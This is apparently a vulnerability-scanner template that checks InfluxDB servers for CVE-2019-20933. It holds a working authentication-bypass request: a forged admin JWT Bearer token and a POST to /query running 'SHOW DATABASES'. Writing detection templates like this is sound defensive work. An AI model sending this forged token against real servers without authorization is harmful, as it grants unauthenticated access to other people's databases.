id: influxdb-cve-2019-20933-unauth

info:
    name: InfluxDB <1.7.6, CVE-2019-20933, Unauthenticated Access
    description: InfluxDB Database, CVE-2019-20933, Unauthenticated Access
    author: yuuki
    severity: critical
    tags: db, database, influxdb, cve, cve-2019-20933, unauth

http:
    - method: POST
      path:
          - "{{BaseURL}}/query"
      headers:
          Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNTM0MDIxODU2MDB9.Fu66RZDcUSawPpmtCpVDMr8kWjbTgmBa4I1kFzCLxM8
          Content-Type: application/x-www-form-urlencoded
      body: "q=SHOW DATABASES"
      matchers:
          - type: word
            words:
                - '"statement_id":0'
            part: body
          - type: status
            status:
                - 200
